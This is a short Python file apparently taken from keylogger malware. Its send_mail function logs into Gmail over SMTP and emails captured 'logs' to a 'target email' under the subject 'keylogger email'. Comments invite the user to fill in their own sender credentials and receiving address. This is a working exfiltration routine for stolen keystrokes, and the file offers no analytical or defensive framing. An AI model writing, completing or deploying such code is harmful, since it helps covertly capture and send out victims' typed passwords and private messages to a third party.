import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_mail(logs):
    """This function is needed in order to send the logs to a target email."""

    msg = MIMEMultipart()
    msg['From'] = 'sender@gmail.com' # change with your own email (the one which is going to send the logs)
    msg['To'] = 'recipient@gmail.com' # change with your target email (the one which is going to receive the logs)
    msg['Subject'] = 'keylogger email' # change with whichever subject you prefer

    #add logs to the mail contents
    msg.attach(MIMEText(logs))
    mailserver = smtplib.SMTP('smtp.gmail.com', 587)
    # identify ourselves to smtp gmail client
    mailserver.ehlo()
    # secure our email with tls encryption
    mailserver.starttls()
    # re-identify ourselves as an encrypted connection
    mailserver.ehlo()
    mailserver.login('me@gmail.com', 'mypassword') # change with your sender email and password
    mailserver.sendmail('sender@gmail.com', 'recipient@gmail.com', msg.as_string()) # change sender and recipient respectively with your own email and the target email
    
    mailserver.quit()